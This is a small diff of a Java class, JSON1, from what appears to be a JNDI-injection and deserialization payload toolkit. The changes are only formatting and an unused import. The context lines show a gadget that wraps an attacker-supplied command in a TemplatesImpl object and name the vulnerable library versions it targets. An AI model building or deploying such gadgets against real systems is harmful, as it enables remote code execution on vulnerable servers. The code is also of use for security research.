@@ -1,6 +1,5 @@
 package com.qi4l.jndi.gadgets;
 
-import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.annotation.Dependencies;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
@@ -13,7 +12,6 @@ import javax.xml.transform.Templates;
 import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
-
 
 
 /**
@@ -54,12 +52,12 @@ import java.util.Map;
         "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
         "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1"})
 @Authors({Authors.MBECHLER})
-public class JSON1 implements ObjectPayload<Object>{
+public class JSON1 implements ObjectPayload<Object> {
 
     public Object getObject(String command) throws Exception {
         final Object tql;
         tql = Gadgets.createTemplatesImpl(command);
-        Class  ifaces = Templates.class;
+        Class ifaces = Templates.class;
         CompositeType rt = new CompositeType("a", "b",
                 new String[]{"a"},
                 new String[]{"a"},
